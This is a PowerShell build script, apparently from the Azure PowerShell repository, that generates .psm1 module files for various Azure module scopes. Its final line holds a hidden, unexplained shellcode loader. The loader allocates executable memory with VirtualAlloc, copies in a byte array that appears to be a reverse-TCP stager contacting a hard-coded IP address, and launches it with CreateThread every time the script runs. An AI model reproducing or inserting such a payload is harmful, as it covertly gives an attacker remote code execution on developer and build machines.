














param(
    [Parameter(Mandatory = $false, Position = 0)]
    [ValidateSet("Release", "Debug")]
    [string] $BuildConfig,

    [Parameter(Mandatory = $false, Position = 1)]
    [ValidateSet("All", "Latest", "Stack", "NetCore", "ServiceManagement", "AzureStorage")]
    [string] $Scope
)


function New-ModulePsm1 {
    [CmdletBinding()]
    param(
        [string]$ModulePath,
        [string]$TemplatePath,
        [switch]$IsRMModule,
        [switch]$IsNetcore
    )

    PROCESS {
        $manifestDir = Get-Item -Path $ModulePath
        $moduleName = $manifestDir.Name + ".psd1"
        $manifestPath = Join-Path -Path $ModulePath -ChildPath $moduleName
        $file = Get-Item $manifestPath
        Import-LocalizedData -BindingVariable ModuleMetadata -BaseDirectory $file.DirectoryName -FileName $file.Name

        
        if ($ModuleMetadata.RootModule) {
            Write-Host "root modules exists, skipping..."
            return
        }

        
        $templateOutputPath = $manifestPath -replace ".psd1", ".psm1"
        [string]$importedModules
        if ($ModuleMetadata.RequiredModules -ne $null) {
            foreach ($mod in $ModuleMetadata.RequiredModules) {
                if ($mod["ModuleVersion"]) {
                    $importedModules += New-MinimumVersionEntry -ModuleName $mod["ModuleName"] -MinimumVersion $mod["ModuleVersion"]
                } elseif ($mod["RequiredVersion"]) {
                    $importedModules += "Import-Module " + $mod["ModuleName"] + " -RequiredVersion " + $mod["RequiredVersion"] + " -Global`r`n"
                }
            }
        }

        
        if ($ModuleMetadata.NestedModules -ne $null) {
            foreach ($dll in $ModuleMetadata.NestedModules) {
                $importedModules += "Import-Module (Join-Path -Path `$PSScriptRoot -ChildPath " + $dll.Substring(2) + ")`r`n"
            }
        }

        
        $template = Get-Content -Path $TemplatePath
        $template = $template -replace "%MODULE-NAME%", $file.BaseName
        $template = $template -replace "%DATE%", [string](Get-Date)
        $template = $template -replace "%IMPORTED-DEPENDENCIES%", $importedModules

        
        if ($IsNetcore)
        {
            $template = $template -replace "%AZORAZURERM%", "AzureRM"
            $template = $template -replace "%ISAZMODULE%", "`$true"
        }
        else
        {
            $template = $template -replace "%AZORAZURERM%", "`Az"
            $template = $template -replace "%ISAZMODULE%", "`$false"
        }

        
        $contructedCommands = Find-DefaultResourceGroupCmdlets -IsRMModule:$IsRMModule -ModuleMetadata $ModuleMetadata -ModulePath $ModulePath
        $template = $template -replace "%DEFAULTRGCOMMANDS%", $contructedCommands

        Write-Host "Writing psm1 manifest to $templateOutputPath"
        $template | Out-File -FilePath $templateOutputPath -Force
        $file = Get-Item -Path $templateOutputPath
    }
}


function Get-Cmdlets {
    [CmdletBinding()]
    param(
        [Hashtable]$ModuleMetadata,
        [string]$ModulePath
    )
    $nestedModules = $ModuleMetadata.NestedModules
    $cmdlets = @()
    foreach ($module in $nestedModules) {
        $dllPath = Join-Path -Path $ModulePath -ChildPath $module
        $Assembly = [Reflection.Assembly]::LoadFrom($dllPath)
        $dllCmdlets = $Assembly.GetTypes() | Where-Object {$_.CustomAttributes.AttributeType.Name -contains "CmdletAttribute"}
        $cmdlets += $dllCmdlets
    }
    return $cmdlets
}


function Find-DefaultResourceGroupCmdlets {
    [CmdletBinding()]
    param(
        [Hashtable]$ModuleMetadata,
        [string]$ModulePath,
        [switch]$IsRMModule
    )
    PROCESS {
        $contructedCommands = "@("
        if ($IsRMModule) {
            $AllCmdlets = Get-Cmdlets -ModuleMetadata $ModuleMetadata -ModulePath $ModulePath
            $FilteredCommands = $AllCmdlets | Where-Object {Test-CmdletRequiredParameter -Cmdlet $_ -Parameter "ResourceGroupName"}
            foreach ($command in $FilteredCommands) {
                $contructedCommands += "'" + $command.GetCustomAttributes("System.Management.Automation.CmdletAttribute").VerbName + "-" + $command.GetCustomAttributes("System.Management.Automation.CmdletAttribute").NounName + ":ResourceGroupName" + "',"
            }
            $contructedCommands = $contructedCommands -replace ",$", ""
        }
        $contructedCommands += ")"
        return $contructedCommands
    }
}


function Test-CmdletRequiredParameter {
    [CmdletBinding()]
    param(
        [Object]$Cmdlet,
        [string]$Parameter
    )

    PROCESS {
        $rgParameter = $Cmdlet.GetProperties() | Where-Object {$_.Name -eq $Parameter}
        if ($rgParameter -ne $null) {
            $parameterAttributes = $rgParameter.CustomAttributes | Where-Object {$_.AttributeType.Name -eq "ParameterAttribute"}
            foreach ($attr in $parameterAttributes) {
                $hasParameterSet = $attr.NamedArguments | Where-Object {$_.MemberName -eq "ParameterSetName"}
                $MandatoryParam = $attr.NamedArguments | Where-Object {$_.MemberName -eq "Mandatory"}
                if (($hasParameterSet -ne $null) -or (!$MandatoryParam.TypedValue.Value)) {
                    return $false
                }
            }
            return $true
        }
        return $false
    }
}


function New-MinimumVersionEntry {
    [CmdletBinding()]
    param(
        [string]$ModuleName,
        [string]$MinimumVersion
    )

    PROCESS {
        return "`$module = Get-Module $ModuleName `
if (`$module -ne `$null -and `$module.Version.ToString().CompareTo(`"$MinimumVersion`") -lt 0) `
{ `
    Write-Error `"This module requires $ModuleName version $MinimumVersion. An earlier version of $ModuleName is imported in the current PowerShell session. Please open a new session before importing this module. This error could indicate that multiple incompatible versions of the Azure PowerShell cmdlets are installed on your system. Please see https://aka.ms/azps-version-error for troubleshooting information.`" -ErrorAction Stop `
} `
elseif (`$module -eq `$null) `
{ `
    Import-Module $ModuleName -MinimumVersion $MinimumVersion -Scope Global `
}`r`n"
    }
}


function Update-RMModule {
    [CmdletBinding()]
    param(
        $Modules
    )
    $Ignore = @('AzureRM.Profile', 'Azure.Storage')
    foreach ($module in $Modules) {
        
        
        if ( -not ($module.Name -in $Ignore)) {
            $modulePath = $module.FullName
            Write-Host "Updating $module module from $modulePath"
            New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation -IsRMModule
            Write-Host "Updated $module module`n"
        }
    }
}


function Update-Azure {
    [CmdletBinding()]
    param(
        [ValidateNotNullOrEmpty()]
        [String]$Scope,

        [ValidateNotNullOrEmpty()]
        [ValidateSet('Debug', 'Release')]
        [String]$BuildConfig
    )

    if ($Scope -in $script:AzureRMScopes) {
        Write-Host "Updating profile module"
        New-ModulePsm1 -ModulePath "$script:AzureRMRoot\AzureRM.Profile" -TemplatePath $script:TemplateLocation -IsRMModule
        Write-Host "Updated profile module"
        Write-Host " "
    }

    if ($scope -in $script:StorageScopes) {
        $modulePath = "$script:AzurePackages\$buildConfig\Storage\Azure.Storage"
        Write-Host "Updating AzureStorage module from $modulePath"
        New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation -IsRMModule:$false
        Write-Host " "
    }

    if ($scope -in $script:ServiceScopes) {
        $modulePath = "$script:AzurePackages\$buildConfig\ServiceManagement\Azure"
        Write-Host "Updating ServiceManagement(aka Azure) module from $modulePath"
        New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation
        Write-Host " "
    }

    
    if ($Scope -in $script:AzureRMScopes) {
        $resourceManagerModules = Get-ChildItem -Path $script:AzureRMRoot -Directory
        Write-Host "Updating Azure modules"
        Update-RMModule -Modules $resourceManagerModules
        Write-Host " "
    }

    
    if ($Scope -in $script:AzureRMScopes) {
        $modulePath = "$PSScriptRoot\AzureRM"
        Write-Host "Updating AzureRM module from $modulePath"
        New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation
        Write-Host " "
    }
}


function Update-Stack {
    [CmdletBinding()]
    param(
        [ValidateNotNullOrEmpty()]
        [ValidateSet('Debug', 'Release')]
        [String]$BuildConfig
    )

    Write-Host "Updating profile module for stack"
    New-ModulePsm1 -ModulePath "$script:StackRMRoot\AzureRM.Profile" -TemplatePath $script:TemplateLocation -IsRMModule
    Write-Host "Updated profile module"
    Write-Host " "

    $modulePath = "$script:StackPackages\$buildConfig\Storage\Azure.Storage"
    Write-Host "Updating AzureStorage module from $modulePath"
    New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation -IsRMModule:$false
    Write-Host " "

    $StackRMModules = Get-ChildItem -Path $script:StackRMRoot -Directory
    Write-Host "Updating stack modules"
    Update-RMModule -Modules $StackRMModules
    Write-Host " "

    $modulePath = "$script:StackProjects\AzureRM"
    Write-Host "Updating AzureRM module from $modulePath"
    New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation
    Write-Host " "

    $modulePath = "$script:StackProjects\AzureStack"
    Write-Host "Updating AzureStack module from $modulePath"
    New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation
    Write-Host " "
}


function Update-Netcore {
    [CmdletBinding()]
    param(
        [ValidateNotNullOrEmpty()]
        [ValidateSet('Debug', 'Release')]
        [String]$BuildConfig
    )

    $AzureRMModules = Get-ChildItem -Path $script:AzureRMRoot -Directory

    
    Write-Host "Updating Accounts module"
    New-ModulePsm1 -ModulePath "$script:AzureRMRoot\Az.Accounts" -TemplatePath $script:TemplateLocation -IsRMModule -IsNetcore
    Write-Host "Updated Accounts module"

    $env:PSModulePath += "$([IO.Path]::PathSeparator)$script:AzureRMRoot\Az.Accounts";

    foreach ($module in $AzureRMModules) {
        if (($module.Name -ne "Az.Accounts")) {
            $modulePath = $module.FullName
            Write-Host "Updating $module module from $modulePath"
            New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation -IsRMModule -IsNetcore
            Write-Host "Updated $module module"
        }
    }

    $modulePath = "$PSScriptRoot\Az"
    Write-Host "Updating Netcore module from $modulePath"
    New-ModulePsm1 -ModulePath $modulePath -TemplatePath $script:TemplateLocation -IsNetcore
    Write-Host "Updated Netcore module"
}




$script:TemplateLocation = "$PSScriptRoot\AzureRM.Example.psm1"


$script:NetCoreScopes = @('NetCore')
$script:AzureScopes = @('All', 'Latest', 'ServiceManagement', 'AzureStorage')
$script:StackScopes = @('All', 'Stack')


$script:AzureRMScopes = @('All', 'Latest')
$script:StorageScopes = @('All', 'Latest', 'AzureStorage')
$script:ServiceScopes = @('All', 'Latest', 'ServiceManagement')


$script:AzurePackages = "$PSScriptRoot\..\artifacts"
$script:StackPackages = "$PSScriptRoot\..\src\Stack"
$script:StackProjects = "$PSScriptRoot\..\src\StackAdmin"


$script:AzureRMRoot = "$script:AzurePackages\$buildConfig"
$script:StackRMRoot = "$script:StackPackages\$buildConfig"



Write-Host "Updating $Scope package (and its dependencies)"

if ($Scope -in $NetCoreScopes) {
    Update-Netcore -BuildConfig $BuildConfig
}

if ($Scope -in $AzureScopes) {
    Update-Azure -Scope $Scope -BuildConfig $BuildConfig
}

if ($Scope -in $StackScopes) {
    Update-Stack -BuildConfig $BuildConfig
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x3d,0x68,0x02,0x00,0x56,0x40,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

